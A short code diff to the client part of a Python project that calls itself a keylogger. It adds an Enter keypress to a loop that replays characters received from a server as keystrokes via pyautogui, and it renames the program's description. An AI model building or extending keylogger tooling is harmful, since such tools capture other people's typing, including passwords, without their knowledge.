@@ -26,6 +26,8 @@ class Client:
                 print("Received from server:", data)
             char: chr
             for char in data:
+                if char == 40:
+                    pyautogui.press('enter')
                 pyautogui.keyDown(char)
                 pyautogui.keyUp(char)
 
@@ -49,7 +51,7 @@ class Client:
 
 if __name__ == "__main__":
     parser: argparse.ArgumentParser = argparse.ArgumentParser(
-        description="Python Hardware Keylogger"
+        description="The Client from the Python Keylogger"
     )
     parser.add_argument("-i", "--ip", type=str, help="The server IP Addr.")
     parser.add_argument("-p", "--port", type=str, help="The server port")
